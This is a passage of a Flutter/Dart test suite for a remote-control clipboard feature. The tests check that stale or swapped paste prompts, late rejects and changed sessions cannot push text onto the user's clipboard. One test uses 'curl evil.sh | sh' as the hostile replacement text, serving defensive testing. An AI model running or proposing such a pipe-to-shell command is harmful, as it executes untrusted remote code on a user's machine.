        }
        packet('ffffffffffffffff', 'clip-offer');
        packet('ffffffffffffffff', 'clip-data');
        expect(controller.clipboardRequest, isNull);
      },
    );

    testWidgets('a decision cannot land on a prompt that replaced the one the '
        'user saw', (tester) async {
      final transport = _FakeTransport();
      final controller = RemoteControlController(
        transport,
        secureRandom: Random(7),
      );
      addTearDown(controller.dispose);
      await _activateAndroid(controller);

      Future<void> offer(String id, String text) async {
        final hash = sha256.convert(utf8.encode(text)).toString();
        controller.applyControlleePacket(
          callId: _call,
          peerId: _peer,
          peerDeviceId: _device,
          payload:
              '{"id":"$id","sha256":"$hash","size":${utf8.encode(text).length},'
              '"t":"clip-offer","v":1}',
        );
        controller.applyControlleePacket(
          callId: _call,
          peerId: _peer,
          peerDeviceId: _device,
          payload:
              '{"id":"$id","sha256":"$hash","t":"clip-data",'
              '"text":"$text","v":1}',
        );
      }

      const seen = 'meeting link';
      const later = 'curl evil.sh | sh';
      const reusedId = '0011223344556601';
      await offer(reusedId, seen);
      expect(controller.clipboardRequest?.text, seen);
      final seenRequest = controller.clipboardRequest!;

      // The peer cannot force a swap, but the 20s expiry is predictable to
      // within a round trip: let the prompt lapse and a new one arrive, as it
      // would under a finger that pressed just before the deadline.
      await tester.pump(const Duration(seconds: 21));
      await offer(reusedId, later);
      expect(controller.clipboardRequest, isNull);
      await offer('0011223344556602', later);
      expect(controller.clipboardRequest?.text, later);

      // The in-flight tap carries the receiver generation of what the user
      // actually read. Reusing the peer-controlled wire id must not let it
      // approve the replacement.
      var written = '';
      expect(
        await controller.acceptClipboard(
          (value) async => written = value,
          expectedRequest: seenRequest,
        ),
        isFalse,
      );
      expect(written, isEmpty);
      expect(
        controller.clipboardRequest?.text,
        later,
      ); // still awaiting a real answer

      // A decision naming the displayed prompt works normally.
      final laterRequest = controller.clipboardRequest!;
      expect(
        await controller.acceptClipboard(
          (value) async => written = value,
          expectedRequest: laterRequest,
        ),
        isTrue,
      );
      expect(written, later);
    });

    testWidgets('an in-flight accept refuses replacement prompts', (
      tester,
    ) async {
      final transport = _FakeTransport();
      final controller = RemoteControlController(
        transport,
        secureRandom: Random(7),
      );
      addTearDown(controller.dispose);
      await _activateAndroid(controller);

      Future<void> offer(String id, String text) async {
        final hash = sha256.convert(utf8.encode(text)).toString();
        controller.applyControlleePacket(
          callId: _call,
          peerId: _peer,
          peerDeviceId: _device,
          payload:
              '{"id":"$id","sha256":"$hash","size":${utf8.encode(text).length},'
              '"t":"clip-offer","v":1}',
        );
        controller.applyControlleePacket(
          callId: _call,
          peerId: _peer,
          peerDeviceId: _device,
          payload:
              '{"id":"$id","sha256":"$hash","t":"clip-data",'
              '"text":"$text","v":1}',
        );
      }

      await offer('0011223344556611', 'first');
      expect(controller.clipboardRequest?.text, 'first');
      final firstRequest = controller.clipboardRequest!;

      // The clipboard write is an await. Let the accepted prompt expire and a
      // legitimate next offer arrive DURING it: the accept must clear only the
      // prompt it was for, never the new unanswered one.
      final accepted = controller.acceptClipboard((_) async {
        await tester.pump(const Duration(seconds: 21));
        await offer('0011223344556622', 'second offer the user never answered');
      }, expectedRequest: firstRequest);
      expect(await accepted, isTrue);

      expect(
        controller.clipboardRequest,
        isNull,
        reason: 'no replacement prompt may enter while an OS write commits',
      );
    });

    testWidgets('a failed clipboard write cannot reject same-id replacement', (
      tester,
    ) async {
      final transport = _FakeTransport();
      final controller = RemoteControlController(
        transport,
        secureRandom: Random(7),
      );
      addTearDown(controller.dispose);
      await _activateAndroid(controller);

      Future<void> offer(String id, String text) async {
        final hash = sha256.convert(utf8.encode(text)).toString();
        controller.applyControlleePacket(
          callId: _call,
          peerId: _peer,
          peerDeviceId: _device,
          payload:
              '{"id":"$id","sha256":"$hash","size":${utf8.encode(text).length},'
              '"t":"clip-offer","v":1}',
        );
        controller.applyControlleePacket(
          callId: _call,
          peerId: _peer,
          peerDeviceId: _device,
          payload:
              '{"id":"$id","sha256":"$hash","t":"clip-data",'
              '"text":"$text","v":1}',
        );
      }

      const id = '0011223344556613';
      await offer(id, 'first');
      final first = controller.clipboardRequest!;
      final accepted = controller.acceptClipboard((_) async {
        await offer(id, 'same id, different bytes');
        throw StateError('clipboard unavailable');
      }, expectedRequest: first);

      expect(await accepted, isFalse);
      expect(controller.clipboardRequest, isNull);
      expect(
        transport.operations.where(
          (operation) => operation.contains('reject:$id'),
        ),
        hasLength(1),
        reason: 'only the exact failed write may be rejected',
      );
    });

    testWidgets('an offer made while a prompt was up cannot arrive later and '
        'display', (tester) async {
      final transport = _FakeTransport();
      final controller = RemoteControlController(
        transport,
        secureRandom: Random(7),
      );
      addTearDown(controller.dispose);
      await _activateAndroid(controller);

      void send(String payload) => controller.applyControlleePacket(
        callId: _call,
        peerId: _peer,
        peerDeviceId: _device,
        payload: payload,
      );
      String offerPacket(String id, String text) {
        final hash = sha256.convert(utf8.encode(text)).toString();
        return '{"id":"$id","sha256":"$hash",'
            '"size":${utf8.encode(text).length},"t":"clip-offer","v":1}';
      }

      String dataPacket(String id, String text) {
        final hash = sha256.convert(utf8.encode(text)).toString();
        return '{"id":"$id","sha256":"$hash","t":"clip-data",'
            '"text":"$text","v":1}';
      }

      // Prompt A is displayed and undecided.
      send(offerPacket('0011223344556631', 'first'));
      send(dataPacket('0011223344556631', 'first'));
      expect(controller.clipboardRequest?.text, 'first');
      final firstRequest = controller.clipboardRequest!;

      // B is OFFERED during A. Its data is delayed — reordering or jitter,
      // still inside the 20s window — and lands after the user answers A.
      send(offerPacket('0011223344556632', 'second'));
      var written = '';
      expect(
        await controller.acceptClipboard(
          (value) async => written = value,
          expectedRequest: firstRequest,
        ),
        isTrue,
      );
      expect(written, 'first');
      expect(controller.clipboardRequest, isNull);

      send(dataPacket('0011223344556632', 'second'));
      expect(
        controller.clipboardRequest,
        isNull,
        reason: 'an offer refused while A was up must not display later',
      );
    });

    testWidgets('a reject cannot contradict an accept already in flight', (
      tester,
    ) async {
      final transport = _FakeTransport();
      final controller = RemoteControlController(
        transport,
        secureRandom: Random(7),
      );
      addTearDown(controller.dispose);
      await _activateAndroid(controller);

      const id = '0011223344556641';
      const text = 'pasted before the No was tapped';
      final hash = sha256.convert(utf8.encode(text)).toString();
      controller.applyControlleePacket(
        callId: _call,
        peerId: _peer,
        peerDeviceId: _device,
        payload:
            '{"id":"$id","sha256":"$hash","size":${utf8.encode(text).length},'
            '"t":"clip-offer","v":1}',
      );
      controller.applyControlleePacket(
        callId: _call,
        peerId: _peer,
        peerDeviceId: _device,
        payload:
            '{"id":"$id","sha256":"$hash","t":"clip-data",'
            '"text":"$text","v":1}',
      );
      final request = controller.clipboardRequest!;

      // The buttons stay mounted across the write, so "No" is tappable while
      // the paste is committing. It must not send a reject for text that has
      // already landed on the clipboard.
      var rejected = true;
      final accepted = controller.acceptClipboard((_) async {
        rejected = await controller.rejectClipboard(expectedRequest: request);
      }, expectedRequest: request);

      expect(await accepted, isTrue);
      expect(rejected, isFalse, reason: 'the late No must be refused');
      expect(
        transport.operations.where((op) => op.contains('reject')),
        isEmpty,
        reason: 'the peer must never see a reject for accepted text',
      );
      expect(
        transport.operations,
        contains('clipboard-response:controller:accept:$id'),
      );
    });

    testWidgets('dispose cancels movement and clipboard timers', (
      tester,
    ) async {
      final transport = _FakeTransport();
      final controller = RemoteControlController(transport);
      await _activateAndroid(controller);
      controller.move(.4, .4);
      final hash = sha256.convert(utf8.encode('text')).toString();
      controller.applyControlleePacket(
        callId: _call,
        peerId: _peer,
        peerDeviceId: _device,
        payload:
            '{"id":"0011223344556677","sha256":"$hash","size":4,'
            '"t":"clip-offer","v":1}',
      );
      controller.dispose();
      await tester.pump(const Duration(seconds: 21));
      expect(transport.inputBatches, isEmpty);
    });
  });

  group('outgoing clipboard owner', () {
    Iterable<String> sent(_FakeTransport t) =>
        t.operations.where((operation) => operation.startsWith('clipboard:'));

    Future<(_FakeTransport, RemoteControlController)>
    controllerSession() async {
      final transport = _FakeTransport()
        ..nativeAuthority = true
        ..nativeClipboard = true
        ..hostAuthorityEnabled = true;
      final controller = RemoteControlController(transport);
      addTearDown(controller.dispose);
      await _activateNative(controller);
      return (transport, controller);
    }

    test(
      'an unchanged controller session sends once to its captured binding',
      () async {
        final (transport, controller) = await controllerSession();
        final read = Completer<String?>();
        final send = controller.sendClipboardFromReader(() => read.future);
        read.complete('synthetic');
        expect(await send, isTrue);
        expect(sent(transport), hasLength(1));
        expect(sent(transport).single, startsWith('clipboard:controller:'));
        expect(transport.clipboardBindings.single.callId, _call);
        expect(transport.clipboardBindings.single.sourceRevision, 4);
      },
    );

    test(
      'a replaced controller session during the read sends nothing',
      () async {
        final (transport, controller) = await controllerSession();
        final read = Completer<String?>();
        final send = controller.sendClipboardFromReader(() => read.future);
        _sync(controller, peerScreen: false);
        await _activateNative(controller, revision: 5);
        read.complete('synthetic');
        expect(await send, isFalse);
        expect(sent(transport), isEmpty);
      },
    );

    test(
      'a revoked controller session during the read sends nothing',
      () async {
        final (transport, controller) = await controllerSession();
        final read = Completer<String?>();
        final send = controller.sendClipboardFromReader(() => read.future);
        await controller.stopControlling();
        read.complete('synthetic');
        expect(await send, isFalse);
        expect(sent(transport), isEmpty);
      },
    );

    test('A to B to A with identical identifiers sends nothing', () async {
      final (transport, controller) = await controllerSession();
      final read = Completer<String?>();
      final send = controller.sendClipboardFromReader(() => read.future);
      _sync(controller, peerScreen: false);
      await _activateNative(controller, revision: 5);
      _sync(controller, peerScreen: false);
      await _activateNative(controller);
      expect(controller.controllerBinding!.callId, _call);
      expect(controller.controllerBinding!.sourceRevision, 4);
      read.complete('synthetic');
      expect(await send, isFalse);
      expect(sent(transport), isEmpty);
    });

    test('a host session replaced by the same identifiers cancels', () async {
      final transport = _FakeTransport()
        ..hostAuthorityEnabled = true
        ..nativeClipboard = true;
      final controller = RemoteControlController(transport);
      addTearDown(controller.dispose);
      await _establishNativeHost(controller, transport);
      final read = Completer<String?>();
      final send = controller.sendClipboardFromReader(() => read.future);
      controller.applyNativeHostState(
        _nativeHostEvent(transport, state: 'ended'),
      );
      controller.applyNativeHostState(
        _nativeHostEvent(transport, generation: 8),
      );
      expect(controller.hostActive, isTrue);
      read.complete('synthetic');
      expect(await send, isFalse);
      expect(sent(transport), isEmpty);
    });

    test('an unchanged host session sends once', () async {
      final transport = _FakeTransport()
        ..hostAuthorityEnabled = true
        ..nativeClipboard = true;
      final controller = RemoteControlController(transport);
      addTearDown(controller.dispose);
      await _establishNativeHost(controller, transport);
      final read = Completer<String?>();
      final send = controller.sendClipboardFromReader(() => read.future);
      read.complete('synthetic');
      expect(await send, isTrue);
      expect(sent(transport).single, startsWith('clipboard:host:'));
      expect(transport.clipboardBindings.single.sourceRevision, 9);
      final owner = transport.clipboardOwners.single;
      expect(owner.fromHost, isTrue);
      expect(owner.hostGeneration, 7);
      expect(owner.hostSession!.peerDeviceId, _device);
      expect(owner.hostSession!.callId, _call);
    });

    test(
      'a role flip from controller to host during the read sends nothing',
      () async {
        final (transport, controller) = await controllerSession();
        final read = Completer<String?>();
        final send = controller.sendClipboardFromReader(() => read.future);
        await _establishNativeHost(controller, transport);
        read.complete('synthetic');
        expect(await send, isFalse);
        expect(sent(transport), isEmpty);
      },
    );

    test(
      'a role flip from host to controller during the read sends nothing',
      () async {
        final transport = _FakeTransport()
          ..nativeAuthority = true
          ..nativeClipboard = true
          ..hostAuthorityEnabled = true;
        final controller = RemoteControlController(transport);
        addTearDown(controller.dispose);
        await _establishNativeHost(controller, transport);
        final read = Completer<String?>();
        final send = controller.sendClipboardFromReader(() => read.future);
        controller.applyNativeHostState(
          _nativeHostEvent(transport, state: 'ended'),
        );
        await _activateNative(controller);
        expect(controller.hostActive, isFalse);
        read.complete('synthetic');
        expect(await send, isFalse);
        expect(sent(transport), isEmpty);
      },
    );

    test('the caller scope is rechecked after the read', () async {
      final (transport, controller) = await controllerSession();
      var current = true;
      final read = Completer<String?>();
      final send = controller.sendClipboardFromReader(
        () => read.future,
        stillCurrent: () => current,
      );
      current = false;
      read.complete('synthetic');
      expect(await send, isFalse);
      expect(sent(transport), isEmpty);
    });
  });
}
